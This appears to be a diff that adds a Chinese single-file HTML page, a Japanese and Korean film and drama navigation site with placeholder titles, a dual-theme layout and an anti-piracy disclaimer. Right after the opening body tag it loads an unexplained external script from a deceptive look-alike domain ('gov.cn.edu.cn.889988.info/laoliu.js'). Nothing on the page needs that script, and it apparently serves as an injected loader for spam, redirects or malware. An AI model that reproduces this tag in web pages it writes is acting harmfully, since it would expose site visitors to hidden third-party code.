@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>日韩电影网 - 日本电影/韩国电影/韩剧/日剧/日韩综艺动漫 | rihandianyingwang-h5</title>
+<meta name="description" content="日韩电影网（rihandianyingwang-h5）用和风×韩流双幕整理日本电影、韩国电影、韩剧、日剧、日韩综艺动漫与字幕画质说明。移动端自适应，https://rihandianyingwang-h5.github.io。" />
+<meta name="keywords" content="日韩电影网,rihandianyingwang-h5,日本电影,韩国电影,韩剧,日剧,日韩综艺,动漫番剧" />
+<link rel="canonical" href="https://rihandianyingwang-h5.github.io/" />
+<meta property="og:title" content="日韩电影网 - 和风×韩流双幕影视导航" />
+<meta property="og:description" content="日本电影、韩国电影、韩剧、日剧、日韩综艺动漫与字幕画质说明，单文件自适应站点。" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://rihandianyingwang-h5.github.io/" />
+<meta name="twitter:card" content="summary_large_image" />
+<style>
+:root{
+  --jp-paper:#f6f1ea;
+  --jp-ink:#23262b;
+  --jp-sakura:#e8a7b8;
+  --jp-indigo:#2b3a67;
+  --kr-night:#0c0f1a;
+  --kr-blue:#3fb6d3;
+  --kr-purple:#9b7bff;
+  --kr-pink:#ff7eb3;
+  --line:#d8cfc2;
+  --radius:16px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;color:var(--jp-ink);background:var(--jp-paper);line-height:1.7}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1200px;margin:0 auto;padding:0 18px}
+
+/* Top bar */
+.topbar{position:sticky;top:0;z-index:50;background:rgba(246,241,234,.92);backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}
+.top-in{display:flex;align-items:center;justify-content:space-between;height:62px;gap:12px}
+.brand{display:flex;align-items:center;gap:10px;font-weight:900;font-size:18px}
+.brand .dot{width:14px;height:14px;border-radius:50%;background:linear-gradient(135deg,var(--jp-sakura),var(--kr-pink) 45%,var(--kr-blue))}
+.brand b em{font-style:normal;color:var(--jp-indigo)}
+.nav{display:flex;gap:6px;flex-wrap:wrap}
+.nav a{font-size:13px;padding:8px 12px;border-radius:999px;border:1px solid var(--line)}
+.nav a:hover{background:var(--jp-indigo);color:#fff;border-color:var(--jp-indigo)}
+.menu-btn{display:none;width:42px;height:42px;border-radius:10px;border:1px solid var(--jp-indigo);background:#fff;color:var(--jp-indigo);font-size:20px;cursor:pointer}
+
+/* Hero split */
+.hero{padding:54px 0 30px}
+.split{display:grid;grid-template-columns:1fr 64px 1fr;gap:0;align-items:stretch;border:1px solid var(--line);border-radius:22px;overflow:hidden;min-height:340px}
+.panel{padding:30px}
+.jp{background:linear-gradient(160deg,#fbf7f2,#f3e7ec);border-right:0}
+.kr{background:radial-gradient(700px 300px at 90% -10%,rgba(155,123,255,.25),transparent 60%),linear-gradient(160deg,#0e1322,#0c0f1a);color:#eaf2ff}
+.midline{display:grid;place-items:center;background:#fff;border-left:1px dashed var(--line);border-right:1px dashed var(--line);font-family:ui-monospace,monospace;color:#9a8f80;writing-mode:vertical-rl;letter-spacing:4px;font-size:12px}
+.kicker{font-family:ui-monospace,monospace;font-size:12px;letter-spacing:3px;text-transform:uppercase;opacity:.8}
+.jp .kicker{color:var(--jp-indigo)}
+.kr .kicker{color:var(--kr-blue)}
+.panel h1{font-size:clamp(26px,3.4vw,38px);line-height:1.08;font-weight:900;margin:10px 0 12px}
+.jp h1 em{font-style:normal;color:var(--jp-sakura)}
+.kr h1 em{font-style:normal;color:var(--kr-pink)}
+.panel p{font-size:14px;opacity:.92;margin-bottom:16px}
+.chips{display:flex;gap:8px;flex-wrap:wrap}
+.chip{font-size:12px;padding:5px 10px;border-radius:999px;border:1px solid currentColor;opacity:.9}
+.jp .chip{color:var(--jp-indigo)}
+.kr .chip{color:var(--kr-blue)}
+.kr .chip.alt{color:var(--kr-purple)}
+.kr .chip.hot{color:var(--kr-pink)}
+
+/* Sections */
+.sec{padding:46px 0;border-bottom:1px solid var(--line)}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:22px}
+.sec-head .tag{font-family:ui-monospace,monospace;font-size:12px;font-weight:800;padding:4px 9px;border-radius:7px;background:var(--jp-indigo);color:#fff}
+.sec-head.kr .tag{background:var(--kr-purple)}
+.sec-head h2{font-size:23px;font-weight:900}
+.sec-head a{margin-left:auto;font-size:13px;color:var(--jp-indigo);border-bottom:1px solid var(--jp-indigo)}
+.sec-head.kr a{color:var(--kr-blue);border-color:var(--kr-blue)}
+
+/* JP film grid */
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.card{border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;background:#fff;display:flex;flex-direction:column}
+.card .cv{aspect-ratio:3/4;display:grid;place-items:center;font-size:38px;background:linear-gradient(160deg,#f7e9ee,#eef0f6)}
+.card .body{padding:12px}
+.card h3{font-size:15px;font-weight:800}
+.card .meta{font-size:12px;color:#7a7066;margin-top:4px;display:flex;gap:6px;flex-wrap:wrap}
+.card .meta span{border:1px solid var(--line);padding:1px 7px;border-radius:999px}
+
+/* KR drama list */
+.drama{border:1px solid var(--line);border-radius:var(--radius);overflow:hidden}
+.row{display:grid;grid-template-columns:54px 1fr auto;gap:14px;align-items:center;padding:14px 16px;border-bottom:1px dashed var(--line);background:#0e1322;color:#eaf2ff}
+.row:last-child{border-bottom:none}
+.row .ep{font-family:ui-monospace,monospace;color:var(--kr-pink);font-weight:800}
+.row h4{font-size:15px;font-weight:800}
+.row p{font-size:13px;color:#9fb6d6}
+.row .plat{font-family:ui-monospace,monospace;font-size:11px;color:var(--kr-blue);white-space:nowrap}
+
+/* Variety two-tone */
+.var2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.vbox{border-radius:var(--radius);padding:20px;border:1px solid var(--line)}
+.vbox.jp{background:linear-gradient(160deg,#fbf7f2,#f1e6ec)}
+.vbox.kr{background:radial-gradient(500px 220px at 95% -10%,rgba(63,182,211,.22),transparent 60%),#0e1322;color:#eaf2ff}
+.vbox h3{font-size:18px;font-weight:900;margin-bottom:10px}
+.vbox ul{list-style:none}
+.vbox li{padding:8px 0;border-bottom:1px dotted rgba(120,120,120,.35);font-size:14px}
+.vbox li:last-child{border-bottom:none}
+
+/* Subtitle / quality */
+.quality{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.q{border:1px solid var(--line);border-radius:var(--radius);padding:18px;background:#fff}
+.q .ic{font-size:24px}
+.q h4{font-size:16px;font-weight:800;margin:8px 0 4px}
+.q p{font-size:13px;color:#6f665c}
+
+/* About */
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:0;border:1px solid var(--line);border-radius:var(--radius);overflow:hidden}
+.about .l{padding:26px;border-right:1px solid var(--line)}
+.about .l h3{font-size:21px;font-weight:900;margin-bottom:10px}
+.about .l p{font-size:14px;color:#5f574d;margin-bottom:10px}
+.about .r{background:#0e1322;color:#cfe0ff;padding:26px;font-family:ui-monospace,monospace;font-size:13px}
+.about .r li{list-style:none;padding:8px 0;border-bottom:1px dashed rgba(120,140,180,.35)}
+.about .r li:before{content:"〘 ";color:var(--kr-pink)}
+.about .r li:after{content:" 〙"}
+
+/* Footer */
+.foot{border-top:2px solid var(--jp-indigo);padding:30px 0;background:#efe7dd}
+.fg{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:18px}
+.foot h4{font-size:13px;letter-spacing:2px;text-transform:uppercase;color:var(--jp-indigo);margin-bottom:10px}
+.foot a{display:block;font-size:13px;color:#5f574d;padding:4px 0}
+.foot a:hover{color:var(--jp-indigo)}
+.url{display:inline-block;margin-top:8px;font-family:ui-monospace,monospace;font-size:12px;border:1px dashed var(--jp-indigo);padding:6px 10px;border-radius:8px}
+.copy{margin-top:20px;text-align:center;font-size:12px;color:#7a7066}
+
+.drawer{position:fixed;inset:0 0 0 auto;width:260px;background:#fff;border-left:2px solid var(--jp-indigo);z-index:60;padding:22px;transform:translateX(100%);transition:transform .28s;display:flex;flex-direction:column;gap:8px}
+.drawer.open{transform:none}
+.drawer a{padding:12px;border-radius:10px;background:#f3eee7;font-size:14px}
+.drawer .x{align-self:flex-end;background:none;border:0;font-size:24px;cursor:pointer;color:var(--jp-indigo)}
+.mask{position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:55;display:none}
+.mask.show{display:block}
+
+@media(max-width:1024px){
+  .grid{grid-template-columns:repeat(3,1fr)}
+  .quality{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr}
+  .about .l{border-right:none;border-bottom:1px solid var(--line)}
+  .fg{grid-template-columns:1fr 1fr}
+}
+@media(max-width:768px){
+  .nav{display:none}
+  .menu-btn{display:block}
+  .split{grid-template-columns:1fr}
+  .midline{writing-mode:horizontal-tb;padding:10px;border-left:0;border-right:0;border-top:1px dashed var(--line);border-bottom:1px dashed var(--line)}
+  .jp{border-right:0}
+  .grid{grid-template-columns:repeat(2,1fr)}
+  .var2{grid-template-columns:1fr}
+  .fg{grid-template-columns:1fr}
+}
+@media(max-width:460px){
+  .grid{grid-template-columns:1fr}
+  .row{grid-template-columns:44px 1fr;grid-template-areas:"ep body" "ep plat"}
+  .row .ep{grid-area:ep}.row .plat{grid-area:plat}.row h4+g{padding-left:0}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+  <div class="wrap top-in">
+    <div class="brand"><span class="dot"></span><b>日韩<em>电影网</em></b></div>
+    <nav class="nav" id="nav">
+      <a href="#jp">日影剧场</a>
+      <a href="#kr">韩影韩剧</a>
+      <a href="#variety">综艺动漫</a>
+      <a href="#quality">字幕画质</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero">
+    <div class="split">
+      <div class="panel jp">
+        <div class="kicker">和風サイド · 日本影视</div>
+        <h1>侘寂、青春、<em>深夜食堂式</em>镜头</h1>
+        <p>日影日剧讲究留白：雨夜车站、电车窗光、便当桌上的沉默。日韩电影网把是枝裕和式家庭戏、松本清张式悬疑、京都动画与深夜日剧整理成“情绪片单”。</p>
+        <div class="chips">
+          <span class="chip">家庭温情</span><span class="chip">青春校园</span><span class="chip">推理悬疑</span><span class="chip">动画电影</span>
+        </div>
+      </div>
+      <div class="midline">38° 片单线 · JP / KR</div>
+      <div class="panel kr">
+        <div class="kicker">K-DRAMA SIDE · 韩国影视</div>
+        <h1>财阀、复仇、<em>雨中回头</em>的名场面</h1>
+        <p>韩影韩剧讲究节奏：前 3 集立人设，第 8 集反转，第 16 集哭着完结。tvN / JTBC / Netflix 韩区内容，按“上头 / 治愈 / 解压 / 细思极恐”排好。</p>
+        <div class="chips">
+          <span class="chip hot">财阀复仇</span><span class="chip">悬疑犯罪</span><span class="chip alt">治愈爱情</span><span class="chip">职场爽剧</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="sec" id="jp">
+    <div class="sec-head"><span class="tag">JP</span><h2>日影剧场</h2><a href="#">更多日本片单 #</a></div>
+    <div class="grid">
+      <article class="card"><div class="cv">🚉</div><div class="body"><h3>末班电车之恋</h3><div class="meta"><span>青春</span><span>8.7</span></div></div></article>
+      <article class="card"><div class="cv">🍱</div><div class="body"><h3>便当与父亲</h3><div class="meta"><span>家庭</span><span>9.0</span></div></div></article>
+      <article class="card"><div class="cv">🌧️</div><div class="body"><h3>京都雨名簿</h3><div class="meta"><span>悬疑</span><span>8.8</span></div></div></article>
+      <article class="card"><div class="cv">🎐</div><div class="body"><h3>夏日风铃社</h3><div class="meta"><span>治愈</span><span>8.5</span></div></div></article>
+      <article class="card"><div class="cv">🏯</div><div class="body"><h3>百物语旅馆</h3><div class="meta"><span>奇幻</span><span>8.4</span></div></div></article>
+      <article class="card"><div class="cv">🎞️</div><div class="body"><h3>胶片里的东京</h3><div class="meta"><span>文艺</span><span>8.9</span></div></div></article>
+      <article class="card"><div class="cv">⛩️</div><div class="body"><h3>神社值班日记</h3><div class="meta"><span>日常</span><span>8.2</span></div></div></article>
+      <article class="card"><div class="cv">🚲</div><div class="body"><h3>坡道上的夏天</h3><div class="meta"><span>青春</span><span>8.6</span></div></div></article>
+    </div>
+  </section>
+
+  <section class="sec" id="kr">
+    <div class="sec-head kr"><span class="tag">KR</span><h2>韩影韩剧</h2><a href="#">更多韩国片单 #</a></div>
+    <div class="drama">
+      <div class="row"><div class="ep">EP16</div><div><h4>江南财阀守则</h4><p>继承、合同、假结婚，第 8 集开始全员不好惹。</p></div><div class="plat">tvN / Netflix</div></div>
+      <div class="row"><div class="ep">EP12</div><div><h4>汉江夜行者</h4><p>刑警+记者+检察官，雨夜追车比台词更有戏。</p></div><div class="plat">JTBC</div></div>
+      <div class="row"><div class="ep">EP20</div><div><h4>济州海风信</h4><p>民宿老板、离职厨师、一只捡来的猫，慢热但上头。</p></div><div class="plat">Netflix</div></div>
+      <div class="row"><div class="ep">MOVIE</div><div><h4>蝉鸣审判</h4><p>韩国法庭片：证人说谎，法官比被告更慌。</p></div><div class="plat">K-Movie</div></div>
+      <div class="row"><div class="ep">EP24</div><div><h4>首尔电话线</h4><p>1998 与 2026 两个时空，用座机谈异地恋。</p></div><div class="plat">SBS</div></div>
+    </div>
+  </section>
+
+  <section class="sec" id="variety">
+    <div class="sec-head"><span class="tag">VP</span><h2>日韩综艺 · 动漫</h2><a href="#">全部分类 #</a></div>
+    <div class="var2">
+      <div class="vbox jp">
+        <h3>日本侧：番组与番剧</h3>
+        <ul>
+          <li>深夜综艺：闲聊、整人、料理、旅行企划</li>
+          <li>深夜动画：京阿尼、MAPPA、ufotable 系</li>
+          <li>特摄与时代剧：假面、战队、江户悬疑</li>
+          <li>纪录片向：铁道、建筑、老铺、手作</li>
+        </ul>
+      </div>
+      <div class="vbox kr">
+        <h3>韩国侧：韩综与 Webtoon 改</h3>
+        <ul>
+          <li>生存选秀：跑票、逆袭、名场面剪辑</li>
+          <li>团综与料理综艺：成员互怼最出圈</li>
+          <li>Webtoon 改剧：Naver 条漫转横屏</li>
+          <li>爱豆综艺：练习室、宿舍、演唱会前传</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <section class="sec" id="quality">
+    <div class="sec-head kr"><span class="tag">SUB</span><h2>字幕与画质说</h2><a href="#">观看说明 #</a></div>
+    <div class="quality">
+      <div class="q"><div class="ic">🈯</div><h4>双语字幕</h4><p>中日 / 中韩术语分开：오빠、先輩、社長、科长，不硬翻成人设崩坏。</p></div>
+      <div class="q"><div class="ic">🖼️</div><h4>画质档位</h4><p>老日影偏胶片颗粒，韩剧暗光场景多；本站只标“高清 / 修复 / 原盘感”，不伪造播放源。</p></div>
+      <div class="q"><div class="ic">📅</div><h4>更新节奏</h4><p>韩剧按周更排片，日剧按季更，动画按 cour 标进度，避免“第几集”看串台。</p></div>
+    </div>
+  </section>
+
+  <section class="sec" id="about">
+    <div class="sec-head"><span class="tag">ABOUT</span><h2>关于日韩电影网</h2></div>
+    <div class="about">
+      <div class="l">
+        <h3>一边是和风留白，一边是韩流情绪</h3>
+        <p>日韩电影网（rihandianyingwang-h5）只做导航与片单：日本电影、韩国电影、韩剧、日剧、日韩综艺动漫、字幕画质说明，全部排成一张“和风×韩流双幕表”。</p>
+        <p>单文件 index.html、CSS/JS 内联、移动端自适应，适合 GitHub Pages 托管，也适合做日韩影视书签站、追剧排片站、影评安利站。</p>
+        <p>不提供盗版资源下载与在线盗播；所有条目仅做信息导航与分类整理。</p>
+      </div>
+      <ul class="r">
+        <li>日影重留白，韩剧重反转</li>
+        <li>按情绪排片，不按流量堆</li>
+        <li>字幕语境分开，不硬翻人设</li>
+        <li>内链用 #，不伪造深链</li>
+        <li>必应友好：标题/描述/canonical 齐</li>
+      </ul>
+    </div>
+  </section>
+
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="fg">
+      <div>
+        <h4>日韩电影网</h4>
+        <p style="font-size:13px;color:#5f574d">和风×韩流双幕：日影 / 韩影 / 日剧 / 韩剧 / 综艺动漫一站式片单。</p>
+        <span class="url">https://rihandianyingwang-h5.github.io</span>
+      </div>
+      <div><h4>日本</h4><a href="#">日本电影 #</a><a href="#">日本剧集 #</a><a href="#">深夜动画 #</a><a href="#">和风综艺 #</a></div>
+      <div><h4>韩国</h4><a href="#">韩国电影 #</a><a href="#">韩剧片单 #</a><a href="#">韩综娱乐 #</a><a href="#">Webtoon 改 #</a></div>
+      <div><h4>站点</h4><a href="#jp">日影剧场 #</a><a href="#kr">韩影韩剧 #</a><a href="#variety">综艺动漫 #</a><a href="#quality">字幕画质 #</a></div>
+    </div>
+    <div class="copy">© 2026 日韩电影网 rihandianyingwang-h5 · 静态日韩影视导航演示，不提供盗版资源下载与在线盗播。</div>
+  </div>
+</footer>
+
+<div class="mask" id="mask"></div>
+<aside class="drawer" id="drawer">
+  <button class="x" id="drawerClose">×</button>
+  <a href="#jp">日影剧场</a>
+  <a href="#kr">韩影韩剧</a>
+  <a href="#variety">综艺动漫</a>
+  <a href="#quality">字幕画质</a>
+  <a href="#about">关于本站</a>
+</aside>
+
+<script>
+  var menuBtn=document.getElementById('menuBtn');
+  var drawer=document.getElementById('drawer');
+  var mask=document.getElementById('mask');
+  var close=document.getElementById('drawerClose');
+  menuBtn.addEventListener('click',function(){drawer.classList.add('open');mask.classList.add('show')});
+  close.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')});
+  mask.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')});
+  drawer.querySelectorAll('a').forEach(function(a){
+    a.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')});
+  });
+</script>
+</body>
+</html>
